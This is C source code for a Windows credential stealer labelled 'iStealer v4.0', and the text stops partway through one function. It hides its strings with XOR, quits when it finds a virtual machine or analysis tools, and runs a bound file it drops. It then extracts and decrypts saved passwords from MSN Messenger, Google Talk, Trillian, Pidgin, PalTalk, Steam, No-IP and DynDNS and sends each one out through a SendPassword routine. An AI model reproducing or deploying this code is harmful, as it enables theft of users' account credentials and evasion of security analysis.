// main.c - iStealer v4.0 - Kizar Labs 2009
//
//////////////////////////////////////////////////////////////////////

#include <windows.h>
#include <stdio.h>
#include <wininet.h>
#include "main.h"
#include "functions.h"

#pragma optimize("gsy",on)
//#pragma comment(linker,"/FILEALIGN:0x200")
#pragma comment(linker, "/NODEFAULTLIB:LIBC")
#pragma comment (lib,"msvcrt")
#pragma comment (lib, "wininet")


// main
//
//////////////////////////////////////////////////////////////////////
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpszCmdLine, int nCmdShow){
	char *fBuffer;
	HRSRC hRes;
	FILE *hFile;
	DWORD dwFileSize;
	char dirProgramFiles[MAX_PATH];
	char dirCommonAppData[MAX_PATH], dirAppData[MAX_PATH];
	char dirBind[MAX_PATH];

	// "SOFTWARE\Microsoft\Windows\CurrentVersion"
	char encryptVar1[] = "\x01\x52\x4D\x45\x50\x52\x40\x50\x46\x58\x48\x68\x61\x71\x6B\x76\x6E\x64\x77\x58\x52\x68\x6C\x67\x6B\x72\x72\x5E\x40\x71\x77\x73\x67\x6D\x70\x53\x64\x70\x70\x6D\x6A\x6F";
	// "ProgramFilesDir"
	char encryptVar2[] = "\x01\x51\x70\x6C\x63\x77\x60\x6F\x45\x6D\x69\x64\x71\x47\x6D\x77";
	// "Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders"
	char encryptVar3[] = "\x01\x52\x6D\x65\x70\x72\x60\x70\x66\x58\x48\x68\x61\x71\x6B\x76\x6E\x64\x77\x58\x52\x68\x6C\x67\x6B\x72\x72\x5E\x40\x71\x77\x73\x67\x6D\x70\x53\x64\x70\x70\x6D\x6A\x6F\x5E\x46\x7C\x75\x6D\x6D\x71\x61\x77\x5D\x51\x6B\x61\x69\x6D\x22\x45\x6B\x69\x65\x67\x71\x77";
	// "Common AppData"
	char encryptVar4[] = "\x01\x42\x6D\x6E\x69\x6A\x6F\x22\x42\x74\x75\x45\x63\x77\x65";
	// "AppData"
	char encryptVar5[] = "\x01\x40\x72\x73\x40\x64\x75\x63";
	// "Local Settings"
	char encryptVar6[] = "\x01\x4D\x6D\x60\x65\x69\x21\x51\x66\x70\x71\x68\x6C\x64\x77";
	// "Local AppData"
	char encryptVar7[] = "\x01\x4D\x6D\x60\x65\x69\x21\x43\x73\x74\x41\x60\x76\x62";
	// "\Temp\"
	char encryptVar9[] = "\x01\x5D\x56\x66\x69\x75\x5D";

	UnXor(encryptVar1);		UnXor(encryptVar2);
	UnXor(encryptVar3);		UnXor(encryptVar4);
	UnXor(encryptVar5);		UnXor(encryptVar6);
	UnXor(encryptVar7);		UnXor(encryptVar9);

// Leemos la configuracion
	hRes = FindResource(NULL, "#1", RT_RCDATA); 
	if (hRes == NULL) 
		return 0;
	fBuffer = (char *)LockResource(LoadResource(NULL, hRes));
	if (fBuffer == NULL) 
		return 0;
	if (SizeofResource(NULL, hRes) != sizeof(struct cData)+1)
		return 0;
	memcpy(&stubConf, fBuffer, sizeof(struct cData));
	FreeResource(hRes);

// Detectamos las maqunas virtuales, ollydbg y procmon
	if (stubConf.isVirtual && InVirtualMachine())
		return 0;
	if (stubConf.isOllyDbg && InOllyDbg())
		return 0;
	if (stubConf.isProcmon && InProcmon())
		return 0;
	if (stubConf.isWireShark && InWireShark())
		return 0;

// Cogemos las rutas del sistema

	// C:\Archivos de programa
	if (!ReadKeyData(HKEY_LOCAL_MACHINE, encryptVar1, encryptVar2, dirProgramFiles))
		return 0;
	// C:\Documents and Settings\All users\Datos de programa
	if (!ReadKeyData(HKEY_LOCAL_MACHINE, encryptVar3, encryptVar4, dirCommonAppData))
		return 0;
	// C:\Documents and Settings\Kizar\Datos de programa
	if (!ReadKeyData(HKEY_CURRENT_USER, encryptVar3, encryptVar5, dirAppData))
		return 0;
	// C:\Documents and Settings\Kizar\Configuración local\Temp\u16event.html
	if (!ReadKeyData(HKEY_CURRENT_USER, encryptVar3, encryptVar6, dirBind)) {
		// Vista Support
		if (!ReadKeyData(HKEY_CURRENT_USER, encryptVar3, encryptVar7, dirBind))
			return 0;
	}

	UnXor2(stubConf.cUrl);

//Si hay algun archivo juntado lo ejecutamos
	if (stubConf.isBind) {
		UnXor2(stubConf.cBind);
		strcat(dirBind, encryptVar9);
		strcat(dirBind, stubConf.cBind);

		hRes = FindResource(NULL, "#2", RT_RCDATA); 
		if (hRes == NULL) 
			return 0;
		fBuffer = (char *)LockResource(LoadResource(NULL, hRes));
		if (fBuffer == NULL) 
			return 0;
		dwFileSize = SizeofResource(NULL, hRes);
		hFile = fopen(dirBind, "wb");
		if (!hFile)
			return 0;
		fwrite(fBuffer, dwFileSize, 1, hFile);
		fclose(hFile);
		//FreeResource(hRes);

		ShellExecute(NULL, NULL, dirBind, NULL, NULL, SW_SHOWNORMAL);
	}

//Cargamos las apis
	LoadApis();

//Cogemos las contraseñas de los diferentes programas
	if (stubConf.isMsnMessenger)
		GetMSNMessenger();
	if (stubConf.isGoogleTalk)
		GetGoogleTalk();
	if (stubConf.isTrillian)
		GetTrillian(dirProgramFiles);
	if (stubConf.isPidgin)
		GetPidgin(0, dirAppData);
	if (stubConf.isPaltalk)
		GetPalTalk();
	if (stubConf.isSteam)
		GetSteam();
	if (stubConf.isNoIp) {
		GetNoIp();
		GetDynDNS(dirCommonAppData);
	}
	if (stubConf.isFirefox)
		GetFirefox(dirAppData);
	if (stubConf.isInternetExplorer)
		GetInternetExplorer7();
	if (stubConf.isFileZilla) {
		GetFileZilla(dirAppData);
		GetFlashFXP(dirCommonAppData);
	}

//Descargamos las apis
	UnloadoadApis();

// Si es necesario nos destruimos
	if (stubConf.isMelt)
		Melt();

	exit(0);
	return 0;
}


// GetMSNMessenger
//
//////////////////////////////////////////////////////////////////////
int GetMSNMessenger() {
	short int entropyData[37] = {0xE0, 0xC8, 0x108, 0x110, 0xC0, 0x114, 0xD8, 0xDC, 0xB4, 0xE4,
									0x118, 0x114, 0x104, 0xB4, 0xD0, 0xDC, 0xD0, 0xE0,0xB4,
									0xE0, 0xD8, 0xDC, 0xC8, 0xB4, 0x110, 0xD4, 0x114,0x118,
									0x114, 0xD4, 0x108, 0xDC, 0xDC, 0xE4, 0x108, 0xC0, 0x0};
	PCREDENTIAL *lpCredentials = NULL;
	DATA_BLOB blobCrypt, blobPlainText, blobEntropy;
	DWORD i, count;
	char temp[100];

	// "Passport.Net\*"
	char encryptVar1[] = "\x01\x51\x63\x70\x77\x75\x6E\x70\x77\x2A\x4B\x64\x76\x5F\x2E";
	// "WindowsLive:name=*"
	char encryptVar2[] = "\x01\x56\x6B\x6D\x60\x6A\x76\x71\x4F\x6D\x73\x64\x38\x6D\x65\x68\x64\x3F\x29";
	UnXor(encryptVar1);	UnXor(encryptVar2);

	if (CredEnumerate == NULL || CredFree == NULL || CryptUnprotectData == NULL)
		return 0;

//MSNMessenger7
	CredEnumerate(encryptVar1, 0, &count, &lpCredentials);
	blobEntropy.pbData = (DWORD)&entropyData;
	blobEntropy.cbData = 74;
	for (i=0; i<count; i++) {
		blobCrypt.pbData = (DWORD)lpCredentials[i]->CredentialBlob;
		blobCrypt.cbData = lpCredentials[i]->CredentialBlobSize;
		CryptUnprotectData(&blobCrypt, NULL, &blobEntropy, NULL, NULL, 1, &blobPlainText);
		sprintf(temp, "%ls", (char *)blobPlainText.pbData);
		SendPassword("0", "", lpCredentials[i]->UserName, temp);
	}
	CredFree(lpCredentials);

//LiveMessenger8
	CredEnumerate(encryptVar2, 0, &count, &lpCredentials);
	for (i=0; i<count; i++) {
		sprintf(temp, "%ls", lpCredentials[i]->CredentialBlob);
		SendPassword("0", "", lpCredentials[i]->UserName, temp);
	}


	CredFree(lpCredentials);
	return 1;
}

// GetGoogleTalk
//
//////////////////////////////////////////////////////////////////////
int GetGoogleTalk() {
	HKEY hKey, hKey2;
	DWORD lEnum, index = 0, dwKeyName = 100, dwData, dwType = REG_SZ;
	char lSubKey2[128], lKeyName[100];
	unsigned char lData[500], lDecryptData[155];
	DATA_BLOB blobCrypt, blobEntropy, blobPlainText;
	unsigned char EntropyData[17];
	DWORD obase, otmp, dwSize;
	char ucname[65], cname[33];
	unsigned int i, b;

	char varpass[128];

	// "Software\Google\Google Talk\Accounts"
	//char encryptVar1[] = "\x01\x52\x6D\x65\x70\x72\x60\x70\x66\x58\x42\x6E\x6D\x64\x68\x60\x5D\x45\x6C\x6B\x62\x6D\x67\x23\x50\x64\x6D\x69\x5F\x45\x66\x62\x6D\x76\x6A\x71\x72";
	// "<tr><td>Google Talk</td><td>Google Talk</td><td>%s</td><td>%s</td></tr>"
	//char encryptVar2[] = "\x01\x3D\x76\x71\x3A\x39\x75\x66\x3D\x43\x6A\x6E\x65\x6F\x61\x25\x55\x63\x6F\x6F\x39\x2E\x76\x67\x3A\x39\x75\x66\x3D\x43\x6A\x6E\x65\x6F\x61\x25\x55\x63\x6F\x6F\x39\x2E\x76\x67\x3A\x39\x75\x66\x3D\x21\x76\x3D\x2D\x77\x60\x3B\x3D\x76\x67\x3A\x20\x72\x3E\x2C\x70\x61\x3F\x3E\x2C\x70\x77\x3F\xF\x9";
	//UnXor(encryptVar1);//	UnXor(encryptVar2);

//Comprobamos si esta instalado y si la api esta cargada
	if (RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Google\\Google Talk\\Accounts", 0, KEY_ALL_ACCESS, &hKey) != ERROR_SUCCESS)
		return 0;
	if (CryptUnprotectData == NULL)
		return 0;

//Cogemos el nombre del usuario y equipo
	dwSize = 32; GetUserName(ucname, &dwSize); ucname[dwSize] = 0;
	dwSize = 32; GetComputerName(cname, &dwSize); cname[dwSize] = 0;
	strcat(ucname, cname);

//Enumeramos todas las cuentas
	lEnum = RegEnumKeyEx(hKey, index, lKeyName, &dwKeyName, NULL, NULL, NULL, NULL);
	do {

		sprintf(lSubKey2, "%s\\%s", "Software\\Google\\Google Talk\\Accounts", lKeyName);
		RegOpenKeyEx(HKEY_CURRENT_USER, lSubKey2, 0, KEY_ALL_ACCESS, &hKey2);
		dwData = 500;
		if (RegQueryValueEx(hKey2, "pw", 0, &dwType, lData, &dwData) == ERROR_SUCCESS) {

			strcpy((char*)EntropyData, "\xA3\x1E\xF3\x69\x07\x62\xD9\x1F\x1E\xE9\x35\x7D\x4F\xD2\x7D\x48");
			obase = 0xBA0DA71D;
			b=0;

		//blobEntropy
			for (i=0; i<strlen(ucname); i++) {
				if(b==16) b=0;
				memcpy(&otmp, (void*)&EntropyData[b], 4);
				otmp ^= ucname[i] * obase;
				memcpy((void*)&EntropyData[b], &otmp, 4);
				obase *= 0x0BC8F;
				b += 4;
			}


		//blobCrypt
			memcpy(&obase, (void*)&EntropyData[0], 4);
			obase |= 1;
			for (i=0; i<309; i+=2) {
				lDecryptData[i/2] = (unsigned char)( (((lData[i+4] - 1) << 4)|(lData[i+5] - 0x21)) - (unsigned char)obase );
				obase *= 0x10ff5;
			}

			blobEntropy.pbData = (DWORD)&EntropyData;
			blobEntropy.cbData = 16;


			blobCrypt.pbData = (DWORD)&lDecryptData;
			blobCrypt.cbData = 154;

			CryptUnprotectData(&blobCrypt, NULL, &blobEntropy, NULL, NULL, 1, &blobPlainText);

			strncpy(varpass, (void*)(blobPlainText.pbData+1 + blobPlainText.cbData), blobPlainText.cbData);
			

			//memset((void*)(blobPlainText.pbData+1 + blobPlainText.cbData), 0, 1);

			SendPassword("1", "", lKeyName, varpass);
		}
		RegCloseKey(hKey2);
		index++;
		dwKeyName = 100;
	}while (RegEnumKeyEx(hKey, index, lKeyName, &dwKeyName, NULL, NULL, NULL, NULL) != ERROR_NO_MORE_ITEMS);
	RegCloseKey(hKey);
	return 1;
}

// GetTrillian
//
//////////////////////////////////////////////////////////////////////
int GetTrillian(char *programFiles) {
	char * dataBuffer = NULL;
	DWORD dataLen, pIni, pFin = 0;
	char sProfilePath[MAX_PATH], sClientPath[MAX_PATH];
	char szUser[100], szEncPass[100], szDecPass[100];
	unsigned int i, b, salt[17] = {0xF3, 0x26, 0x81, 0xC4, 0x39, 0x86, 0xDB, 0x92, 0x71, 0xA3, 0xB9, 0xE6, 0x53, 0x7A, 0x95, 0x7C};
	char newLine[] = "\x0D\x0A";

	// "name="
	char encryptVar1[] = "\x01\x6F\x63\x6E\x61\x38";
	// "password="
	char encryptVar2[] = "\x01\x71\x63\x70\x77\x72\x6E\x70\x67\x39";
	// "\msn.ini"
	char encryptVar3[] = "\x01\x5D\x6F\x70\x6A\x2B\x68\x6C\x6A";
	// "\aim.ini"
	char encryptVar4[] = "\x01\x5D\x63\x6A\x69\x2B\x68\x6C\x6A";
	// "\yahoo.ini"
	char encryptVar5[] = "\x01\x5D\x7B\x62\x6C\x6A\x6E\x2C\x6A\x6A\x6C";
	// "<tr><td>Trillian</td><td>Msn Messenger</td><td>%s</td><td>%s</td></tr>"
	char encryptVar6[] = "\x01\x3D\x76\x71\x3A\x39\x75\x66\x3D\x50\x77\x68\x6E\x6F\x6D\x64\x6F\x3E\x2C\x70\x61\x3F\x3E\x77\x60\x3B\x4C\x71\x6D\x24\x48\x64\x71\x70\x61\x6B\x66\x67\x71\x38\x2A\x75\x66\x3D\x38\x71\x65\x3C\x26\x77\x39\x2E\x76\x67\x3A\x39\x75\x66\x3D\x21\x76\x3D\x2D\x77\x60\x3B\x3D\x2D\x77\x76\x3B\xC\x8";
	// "<tr><td>Trillian</td><td>AIM</td><td>%s</td><td>%s</td></tr>"
	char encryptVar7[] = "\x01\x3D\x76\x71\x3A\x39\x75\x66\x3D\x50\x77\x68\x6E\x6F\x6D\x64\x6F\x3E\x2C\x70\x61\x3F\x3E\x77\x60\x3B\x40\x4B\x4E\x38\x2A\x75\x66\x3D\x38\x71\x65\x3C\x26\x77\x39\x2E\x76\x67\x3A\x39\x75\x66\x3D\x21\x76\x3D\x2D\x77\x60\x3B\x3D\x2D\x77\x76\x3B\xC\x8";
	// "<tr><td>Trillian</td><td>Yahoo</td><td>%s</td><td>%s</td></tr>"
	char encryptVar8[] = "\x01\x3D\x76\x71\x3A\x39\x75\x66\x3D\x50\x77\x68\x6E\x6F\x6D\x64\x6F\x3E\x2C\x70\x61\x3F\x3E\x77\x60\x3B\x58\x63\x6B\x6B\x6A\x3D\x2D\x77\x60\x3B\x3D\x76\x67\x3A\x20\x72\x3E\x2C\x70\x61\x3F\x3E\x77\x60\x3B\x24\x71\x3F\x2B\x71\x65\x3C\x3F\x2B\x71\x73\x3C\xE\xE";
	// "\Trillian\users\default"
	char encryptVar9[] = "\x01\x5D\x56\x71\x6D\x69\x6D\x6B\x62\x6A\x59\x74\x71\x66\x76\x76\x5D\x66\x66\x62\x64\x74\x6E\x77";
	UnXor(encryptVar1);	UnXor(encryptVar2);
	UnXor(encryptVar3);	UnXor(encryptVar4);
	UnXor(encryptVar5);	UnXor(encryptVar6);
	UnXor(encryptVar7);	UnXor(encryptVar8);
	UnXor(encryptVar9);

	strcpy(sProfilePath, programFiles);
	strcat(sProfilePath, encryptVar9);

	for (i=0; i<3; i++) {

		if (i == 0) {
			//Trillian MSN
			strcpy(sClientPath, sProfilePath);
			strcat(sClientPath, encryptVar3);
		} else if (i == 1) {
			//Trillian AIM
			strcpy(sClientPath, sProfilePath);
			strcat(sClientPath, encryptVar4);
		} else if (i == 2) {
			//Trillian Yahoo
			strcpy(sClientPath, sProfilePath);
			strcat(sClientPath, encryptVar5);
		}

		if (!ReadFileData(sClientPath, &dataBuffer, &dataLen))
			continue;

		pIni = FindString(dataBuffer, dataLen, encryptVar1, 0);
		if (pIni == 0) {
			free(dataBuffer);
			continue;
		}
		pIni += 5;
		pFin = FindString(dataBuffer, dataLen, newLine, pIni);
		strncpy(szUser, &dataBuffer[pIni], pFin-pIni);
		szUser[pFin-pIni] = 0;

		pIni = FindString(dataBuffer, dataLen, encryptVar2, 0);
		if (pIni == 0) {
			free(dataBuffer);
			continue;
		}
		pIni += 9;
		pFin = FindString(dataBuffer, dataLen, newLine, pIni);
		strncpy(szEncPass, &dataBuffer[pIni], pFin-pIni);
		szEncPass[pFin-pIni] = 0;

		// Desencriptar contraseña
		for (b=0; b<strlen(szEncPass)/2; b++) {
			sscanf(&szEncPass[b*2], "%02x", &szDecPass[b]);
			szDecPass[b] ^= salt[b%16];
		}
		szDecPass[b] = 0;

		if (i == 0)
			SendPassword("2", "", szUser, szDecPass);
		else if (i == 1)
			SendPassword("3", "", szUser, szDecPass);
		else if (i == 2)
			SendPassword("4", "", szUser, szDecPass);

		free(dataBuffer);
	}
	return 1;
}

// GetPidgin
//
//////////////////////////////////////////////////////////////////////
int GetPidgin(int none, char *appData) {

	// "<name>"
	char encryptVar1[] = "\x01\x3D\x6C\x62\x69\x60\x3F";
	// "</name>"
	char encryptVar2[] = "\x01\x3D\x2D\x6D\x65\x68\x64\x3C";
	// "<password>"
	char encryptVar3[] = "\x01\x3D\x72\x62\x77\x76\x76\x6D\x71\x60\x3B";
	// "</password>"
	char encryptVar4[] = "\x01\x3D\x2D\x73\x65\x76\x72\x75\x6C\x76\x61\x3F";
	// "\.purple\accounts.xml"
	char encryptVar5[] = "\x01\x5D\x2C\x73\x71\x77\x71\x6E\x66\x58\x64\x62\x61\x6C\x71\x6B\x75\x71\x2D\x7C\x68\x6D";
	// "<tr><td>Pidgin</td><td>Pidgin</td><td>%s</td><td>%s</td></tr>"
	char encryptVar6[] = "\x01\x3D\x76\x71\x3A\x39\x75\x66\x3D\x54\x6C\x65\x65\x6A\x6A\x39\x2E\x76\x67\x3A\x39\x75\x66\x3D\x54\x6C\x65\x65\x6A\x6A\x39\x2E\x76\x67\x3A\x39\x75\x66\x3D\x21\x76\x3D\x2D\x77\x60\x3B\x3D\x76\x67\x3A\x20\x72\x3E\x2C\x70\x61\x3F\x3E\x2C\x70\x77\x3F\xF\x9";
	char sProfilePath[500];
	char szUser[120], szEncPass[120];
	char * dataBuffer;
	DWORD dataLen, pIni, pFin;
	

	pFin = 0;

	strcpy(sProfilePath, appData);

	UnXor(encryptVar1);	UnXor(encryptVar2);
	UnXor(encryptVar3);	UnXor(encryptVar4);
	UnXor(encryptVar5);	UnXor(encryptVar6);

	strcat(sProfilePath, encryptVar5);
	if (!ReadFileData(sProfilePath, &dataBuffer, &dataLen))
		return 0;

	pIni = FindString(dataBuffer, dataLen, encryptVar1, 0);
	if (pIni == 0) {
		free(dataBuffer);
		return 0;
	}
	pIni += 6;
	pFin = FindString(dataBuffer, dataLen, encryptVar2, pIni);
	strncpy(szUser, &dataBuffer[pIni], pFin - pIni);
	szUser[pFin - pIni] = 0;

	pIni = FindString(dataBuffer, dataLen, encryptVar3, 0);
	if (pIni == 0) {
		free(dataBuffer);
		return 0;
	}
	pIni += 10;
	pFin = FindString(dataBuffer, dataLen, encryptVar4, pIni);
	strncpy(szEncPass, &dataBuffer[pIni], pFin - pIni);
	szEncPass[pFin - pIni] = 0;

	SendPassword("5", "", szUser, szEncPass);
	free(dataBuffer);
	return 1;
}

// GetPalTalk
//
//////////////////////////////////////////////////////////////////////
int GetPalTalk() {
	unsigned long serialnum, i;
	char nickname[50], pwd[200], szDecPass[32];
	char mixed[64], serial[64], swap;
	unsigned char temp[3];

	HKEY hKey, hKey2;
	DWORD lEnum, index=0, dwKeyName = 100, dwData, dwType = REG_SZ;
	char lSubKey2[128], lKeyName[100];


	// "Software\Paltalk"
	char encryptVar1[] = "\x01\x52\x6D\x65\x70\x72\x60\x70\x66\x58\x55\x60\x6E\x77\x65\x69\x6A";
	// "C:\"
	char encryptVar2[] = "\x01\x42\x38\x5F";
	// "nickname"
	char encryptVar3[] = "\x01\x6F\x6B\x60\x6F\x6B\x60\x6F\x66";
	// "pwd"
	char encryptVar4[] = "\x01\x71\x75\x67";
	UnXor(encryptVar1);	UnXor(encryptVar2);
	UnXor(encryptVar3);	UnXor(encryptVar4);


	// Comprobamos si esta instalado
	if (RegOpenKeyEx(HKEY_CURRENT_USER, encryptVar1, 0, KEY_ALL_ACCESS, &hKey) != ERROR_SUCCESS)
		return 0;

	// Cogemos el numero de serie del discoduro
	if (GetDriveType(encryptVar2) == 3) {
		if(GetVolumeInformation(encryptVar2, 0, 0, &serialnum, 0, 0, 0, 0))
			sprintf(serial, "%08X", serialnum);
		else
			return 0;
	} else
		return 0;

	// Enumeramos todas las cuentas
	lEnum = RegEnumKeyEx(hKey, index, lKeyName, &dwKeyName, NULL, NULL, NULL, NULL);
	do {

		sprintf(lSubKey2, "%s\\%s", encryptVar1, lKeyName);
		RegOpenKeyEx(HKEY_CURRENT_USER, lSubKey2, 0, KEY_ALL_ACCESS, &hKey2);
		dwData = 50;
		if (RegQueryValueEx(hKey2, encryptVar3, 0, &dwType, nickname, &dwData) != ERROR_SUCCESS)
			return 0;
		dwData = 150;
		if (RegQueryValueEx(hKey2, encryptVar4, 0, &dwType, pwd, &dwData) != ERROR_SUCCESS)
			return 0;
		// Mezclamos el nombre de usuario con el numero de serie
		for (i=0; i<strlen(nickname)+8; i++) {
			if (i>=strlen(nickname)*2) {
				mixed[i] = 0;
				strcat((char *)mixed, &serial[i/2]);
				break;
			}
			if (i>=16) {
				mixed[i] = 0;
				strcat((char *)mixed, &nickname[i/2]);
				break;
			}
			if (i%2 == 0) mixed[i] = nickname[i/2]; else mixed[i] = serial[i/2];
		}
		// Rotamos uno todos los caracteres
		swap = mixed[strlen(nickname)+7];
		for (i=strlen(nickname)+7; i>0; i--) {
			mixed[i] = mixed[i-1];
		}
		mixed[0] = swap;
		mixed[strlen(nickname)+8] = 0;

		// Calculamos letra a letra el pass
		for (i=0; i<strlen(pwd); i+=4) {
			temp[0] = pwd[i]-48;
			temp[1] = pwd[i+1]-48;
			temp[2] = pwd[i+2]-48;
			temp[3] = 0;
			temp[3] = (10*temp[3])+temp[0];
			temp[3] = (10*temp[3])+temp[1];
			temp[3] = (10*temp[3])+temp[2];
			temp[3] = 134-mixed[i/4]-(i/4)+temp[3];
			szDecPass[i/4] = temp[3];
		}
		szDecPass[strlen(pwd)/4] = 0;

		SendPassword("6", "", nickname, szDecPass);

		RegCloseKey(hKey2);
		index++;
		dwKeyName = 100;
	}while (RegEnumKeyEx(hKey, index, lKeyName, &dwKeyName, NULL, NULL, NULL, NULL) != ERROR_NO_MORE_ITEMS);
	RegCloseKey(hKey);
	return 1;

}

// GetSteam
//
//////////////////////////////////////////////////////////////////////
int GetSteam() {
	HMODULE hSteam;
	typeSteamDecryptDataForThisMachine SteamDecryptDataForThisMachine;
	DWORD dataLen, dwDecPassLen;
    char *dataBuffer;
	char szUser[32], szEncPass[512], szDecPass[32];
	char dirSteam[MAX_PATH], dllPath[MAX_PATH], blobPath[MAX_PATH];
	unsigned int i;
	//Users 0x01 0x50
	char users[] = "\x55\x73\x65\x72\x73\x01\x50";
	//Phrase 0x01 0x50
	char phrase[] = "\x50\x68\x72\x61\x73\x65\x01\x50";

	// "SOFTWARE\Valve\Steam"
	char encryptVar1[] = "\x01\x52\x4D\x45\x50\x52\x40\x50\x46\x58\x53\x60\x6E\x75\x61\x59\x52\x76\x66\x65\x68";
	// "InstallPath"
	char encryptVar2[] = "\x01\x48\x6C\x70\x70\x64\x6D\x6E\x53\x65\x71\x69";
	// "\Steam.dll"
	char encryptVar3[] = "\x01\x5D\x51\x77\x61\x64\x6C\x2C\x67\x68\x69";
	// "\ClientRegistry.blob"
	char encryptVar4[] = "\x01\x5D\x41\x6F\x6D\x60\x6F\x76\x51\x61\x62\x68\x71\x77\x76\x7C\x2F\x60\x6F\x6B\x67";
	// "SteamDecryptDataForThisMachine"
	char encryptVar5[] = "\x01\x52\x76\x66\x65\x68\x45\x67\x60\x76\x7C\x71\x76\x47\x65\x71\x60\x44\x6C\x76\x51\x69\x6B\x70\x49\x64\x62\x6A\x6A\x6A\x60";
	// "<tr><td>Steam</td><td>Steam</td><td>%s</td><td>%s</td></tr>"
	char encryptVar6[] = "\x01\x3D\x76\x71\x3A\x39\x75\x66\x3D\x57\x71\x64\x63\x6E\x38\x2A\x75\x66\x3D\x38\x71\x65\x3C\x50\x70\x60\x60\x6F\x3F\x2B\x71\x65\x3C\x3F\x70\x61\x3F\x27\x70\x38\x2A\x75\x66\x3D\x38\x71\x65\x3C\x26\x77\x39\x2E\x76\x67\x3A\x39\x2E\x76\x71\x3A\x8\xB";
	UnXor(encryptVar1);	UnXor(encryptVar2);
	UnXor(encryptVar3);	UnXor(encryptVar4);
	UnXor(encryptVar5);	UnXor(encryptVar6);


	// C:\Archivos de programa\Steam
	if (!ReadKeyData(HKEY_LOCAL_MACHINE, encryptVar1, encryptVar2, dirSteam))
		return 0;

	strcpy(dllPath, dirSteam);
	strcat(dllPath, encryptVar3);
	strcpy(blobPath, dirSteam);
	strcat(blobPath, encryptVar4);

	hSteam = LoadLibrary(dllPath);
	if (hSteam == 0)
		return 0;

	SteamDecryptDataForThisMachine = (typeSteamDecryptDataForThisMachine)GetProcAddress(hSteam, encryptVar5);
	if (SteamDecryptDataForThisMachine == NULL)
		return 0;

	if (!ReadFileData(blobPath, &dataBuffer, &dataLen))
		return 0;

//Usuario
	strncpy(szUser, &dataBuffer[FindString(dataBuffer, dataLen, users, 0) + 41], 32);
	for (i=0; i<strlen(szUser); i++) {
		if (szUser[i] == 1) {
			szUser[i] = 0;
			break;
		}
	}

//Password
	strncpy(szEncPass, &dataBuffer[FindString(dataBuffer, dataLen, phrase, 0) + 40], 512);
	szEncPass[strlen(szEncPass) - 1] = 0;

	if (SteamDecryptDataForThisMachine(szEncPass, strlen(szEncPass), szDecPass, 32, &dwDecPassLen))
		return 0;
	szDecPass[dwDecPassLen] = 0;

	SendPassword("7", "", szUser, szDecPass);

	free(dataBuffer);
	FreeLibrary(hSteam);
	return 1;
}

// GetNoIp
//
//////////////////////////////////////////////////////////////////////
int GetNoIp() {
	CHAR szUser[50], szEncPass[32], szDecPass[32];

	// "SOFTWARE\Vitalwerks\DUC"
	char encryptVar1[] = "\x01\x52\x4D\x45\x50\x52\x40\x50\x46\x58\x53\x68\x76\x62\x68\x72\x64\x70\x68\x77\x59\x45\x57\x40";
	// "Username"
	char encryptVar2[] = "\x01\x54\x71\x66\x76\x6B\x60\x6F\x66";
	// "Password"
	char encryptVar3[] = "\x01\x51\x63\x70\x77\x72\x6E\x70\x67";
	// "<tr><td>No-Ip Duc</td><td>No-Ip</td><td>%s</td><td>%s</td></tr>"
	char encryptVar4[] = "\x01\x3D\x76\x71\x3A\x39\x75\x66\x3D\x4A\x6A\x2C\x4B\x73\x24\x41\x74\x61\x3F\x2B\x71\x65\x3C\x3F\x70\x61\x3F\x4C\x6C\x29\x4C\x71\x3E\x2C\x70\x61\x3F\x3E\x77\x60\x3B\x24\x71\x3F\x2B\x71\x65\x3C\x3F\x70\x61\x3F\x27\x70\x38\x2A\x75\x66\x3D\x38\x2A\x75\x70\x3D\x9\xF";
	UnXor(encryptVar1);	UnXor(encryptVar2);
	UnXor(encryptVar3);	UnXor(encryptVar4);

	if(!ReadKeyData(HKEY_LOCAL_MACHINE, encryptVar1, encryptVar2, szUser))
		return 0;

	if(!ReadKeyData(HKEY_LOCAL_MACHINE, encryptVar1, encryptVar3, szEncPass))
		return 0;

	Base64Decode(1, szEncPass, szDecPass);
	SendPassword("8", "", szUser, szDecPass);

	return 1;
}

// GetDynDNS
//
//////////////////////////////////////////////////////////////////////
int GetDynDNS(char *commonAppData) {
	char * dataBuffer = NULL;
	DWORD dataLen, pIni, pFin = 0;
	unsigned int i;
	char sProfilePath[MAX_PATH];
	char szUser[100], szEncPass[100], szDecPass[50];
	// "t6KzXhCh"
	char salt[] = "\x01\x75\x34\x48\x7E\x5D\x69\x41\x6B";
	char fin[3] = "\x0D\x0A";

	// "Username="
	char encryptVar1[] = "\x01\x54\x71\x66\x76\x6B\x60\x6F\x66\x39";
	// "Password="
	char encryptVar2[] = "\x01\x51\x63\x70\x77\x72\x6E\x70\x67\x39";
	// "\DynDNS\Updater\config.dyndns"
	char encryptVar3[] = "\x01\x5D\x46\x7A\x6A\x41\x4F\x51\x5F\x51\x75\x65\x63\x77\x61\x77\x5D\x61\x6C\x6A\x63\x68\x65\x2D\x60\x7C\x6F\x66\x6D\x77";
	// "<tr><td>DynDNS Updater</td><td>DynDNS</td><td>%s</td><td>%s</td></tr>"
	char encryptVar4[] = "\x01\x3D\x76\x71\x3A\x39\x75\x66\x3D\x40\x7C\x6F\x46\x4D\x57\x25\x54\x72\x67\x65\x71\x64\x70\x3F\x2B\x71\x65\x3C\x3F\x70\x61\x3F\x46\x7A\x6A\x41\x4F\x51\x3F\x2B\x71\x65\x3C\x3F\x70\x61\x3F\x27\x70\x38\x2A\x75\x66\x3D\x38\x71\x65\x3C\x26\x77\x39\x2E\x76\x67\x3A\x39\x2E\x76\x71\x3A\x8\xB";
	UnXor(encryptVar1);	UnXor(encryptVar2);
	UnXor(encryptVar3);	UnXor(encryptVar4);
	UnXor(salt);

	strcpy(sProfilePath, commonAppData);
	strcat(sProfilePath, encryptVar3);

	if (!ReadFileData(sProfilePath, &dataBuffer, &dataLen))
		return 0;

	// Username
	pIni = FindString(dataBuffer, dataLen, encryptVar1, 0);
	if (pIni == 0) {
		free(dataBuffer);
		return 0;
	}
	pIni += 9;
	pFin = FindString(dataBuffer, dataLen, fin, pIni);
	strncpy(szUser, &dataBuffer[pIni], pFin-pIni);
	szUser[pFin-pIni] = 0;

	// Password
	pIni = FindString(dataBuffer, dataLen, encryptVar2, 0);
	if (pIni == 0) {
		free(dataBuffer);
		return 0;
	}
	pIni += 9;
	pFin = FindString(dataBuffer, dataLen, fin, pIni);
	strncpy(szEncPass, &dataBuffer[pIni], pFin-pIni);
	szEncPass[pFin-pIni] = 0;

	for (i=0; i<strlen(szEncPass)/2; i++) {
